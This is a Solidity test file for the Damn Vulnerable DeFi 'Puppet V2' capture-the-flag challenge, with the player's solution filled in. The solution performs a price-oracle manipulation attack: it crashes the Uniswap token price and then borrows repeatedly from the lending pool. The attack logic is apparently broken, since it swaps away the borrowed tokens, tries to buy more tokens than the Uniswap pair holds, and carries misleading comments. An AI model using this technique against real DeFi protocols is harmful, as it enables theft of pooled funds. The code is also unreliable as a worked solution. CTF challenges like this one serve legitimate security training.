// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // Step 1: Swap a large number of tokens for Ether to manipulate the price in Uniswap V2
        token.approve(address(uniswapV2Router), 10000 ether); // Approve the router to spend tokens
        address[] memory tokenToWethPath = new address[](2);  // Path for swapping Token → WETH
        tokenToWethPath[0] = address(token);                  // Input token (DamnValuableToken)
        tokenToWethPath[1] = address(weth);                   // Output token (WETH)
    
        uniswapV2Router.swapExactTokensForETH(
            10000 ether,                // amountIn: Amount of tokens to swap
            0,                          // amountOutMin: Accept any amount of Ether
            tokenToWethPath,            // Path: Token → WETH
            msg.sender,                 // to: Send Ether to the attacker
            block.timestamp + 300       // deadline: 5 minutes from now
        );
    
        // Step 2: Borrow tokens in a loop, manipulate the price in each iteration
        for (uint256 i = 0; i < 20; i++) {
            // Calculate the WETH required for the next borrowing transaction
            uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(50_000 ether);
    
            // Convert the required amount of Ether to WETH
            weth.deposit{value: wethRequired}();
            weth.approve(address(lendingPool), wethRequired); // Approve the pool to spend WETH
    
            // Borrow tokens from the lending pool
            lendingPool.borrow(50_000 ether);
    
            // Swap the borrowed tokens back to Ether to manipulate the price again
            token.approve(address(uniswapV2Router), 50_000 ether);
            uniswapV2Router.swapExactTokensForETH(
                50_000 ether,             // amountIn: Amount of tokens to swap
                0,                        // amountOutMin: Accept any amount of Ether
                tokenToWethPath,          // Path: Token → WETH
                msg.sender,               // to: Send Ether to the attacker
                block.timestamp + 300     // deadline: 5 minutes from now
            );
        }
    
        // Step 3: Purchase the remaining tokens from the pool using WETH
        address[] memory wethToTokenPath = new address[](2);   // Path for swapping WETH → Token
        wethToTokenPath[0] = address(weth);                   // Input token (WETH)
        wethToTokenPath[1] = address(token);                  // Output token (DamnValuableToken)
    
        // Calculate the amount of WETH required to buy all tokens in the pool
        uint256[] memory wethAmountsIn = uniswapV2Router.getAmountsIn(POOL_INITIAL_TOKEN_BALANCE, wethToTokenPath);
        uint256 wethNeeded = wethAmountsIn[0];
    
        // Swap Ether for all remaining tokens in the pool
        uniswapV2Router.swapExactETHForTokens{value: wethNeeded}(
            0,                          // amountOutMin: Accept any number of tokens
            wethToTokenPath,            // Path: WETH → Token
            player,                     // to: Send tokens to the attacker
            block.timestamp             // deadline: 5 minutes from now
        );
    
        // Step 4: Transfer all tokens to the recovery address
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE); // Transfer all borrowed tokens to the recovery address
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}




